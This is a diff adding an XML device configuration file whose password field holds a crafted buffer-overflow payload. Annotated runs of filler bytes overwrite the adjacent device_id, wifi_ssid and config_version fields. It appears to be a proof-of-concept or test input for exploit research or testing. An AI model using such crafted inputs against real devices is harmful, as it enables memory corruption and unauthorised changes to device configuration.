@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<config>
+    <username>admin</username>
+    <password>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  <!-- 32 bytes fills password -->
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  <!-- 36 bytes overwrites device_id -->
+CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  <!-- 32 bytes overwrites wifi_ssid -->
+DDDD                              <!-- 4 bytes overwrites config_version -->
+    </password>
+    <device_id>550e8400-e29b-41d4-a716-446655440000</device_id>
+    <wifi_network>My_Home</wifi_network>
+    <config_ver>1</config_ver>
+</config>
